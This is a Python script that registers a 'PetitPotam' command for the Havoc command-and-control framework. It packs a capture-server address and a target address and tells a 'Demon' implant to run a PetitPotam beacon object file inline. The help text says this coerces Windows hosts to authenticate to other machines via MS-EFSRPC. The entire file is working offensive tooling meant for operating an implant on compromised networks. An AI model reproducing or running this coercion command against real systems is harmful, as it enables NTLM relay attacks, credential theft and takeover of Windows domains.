from havoc import Demon, RegisterCommand
from struct import pack, calcsize

class MyPacker:
    def __init__(self):
        self.buffer : bytes = b''
        self.size   : int   = 0

    def getbuffer(self):
        return pack("<L", self.size) + self.buffer

    def addwidestr(self, s):
        if isinstance(s, str):
            s = s.encode("utf-16")
        fmt = "<L{}s".format(len(s) + 1)
        self.buffer += pack(fmt, len(s)+1, s)
        self.size += calcsize(fmt)

def petit_potam(demonID, *params):
    TaskID : str    = None
    demon  : Demon  = None
    packer = MyPacker()

    num_params = len(params)
    captureserver = ''
    target = ''

    demon = Demon( demonID )

    if num_params != 2:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Wrong number of arguments" )
        return True

    captureserver = params[0]
    target = params[1]


    packer.addwidestr(captureserver)
    packer.addwidestr(target)

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to execute PetitPotam BOF" )

    demon.InlineExecute( TaskID, "go", "bin/PetitPotam.o", packer.getbuffer(), False )

    return TaskID

RegisterCommand( petit_potam, "", "PetitPotam", "Coerce Windows hosts to authenticate to other machines via MS-EFSRPC", 0, "[capture server ip or hostname] [target server ip or hostname]", "KALI DC2019" )
